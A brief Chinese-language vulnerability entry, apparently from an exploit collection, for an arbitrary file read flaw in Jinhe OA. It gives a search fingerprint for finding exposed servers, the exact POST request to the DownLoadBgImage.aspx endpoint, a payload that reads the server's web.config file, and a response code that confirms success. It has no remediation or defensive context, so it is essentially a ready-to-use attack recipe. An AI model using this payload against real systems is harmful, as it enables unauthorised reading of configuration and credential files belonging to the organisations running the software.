# 金和OADownLoadBgImage存在任意文件读取漏洞

金和OA ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/Jhsoft.Web.AddMenu/LoginTemplate/DownLoadBgImage.aspx/ HTTP/1.1`

**Payload**
```
path=/c6/web.config
```
- **响应特征**：200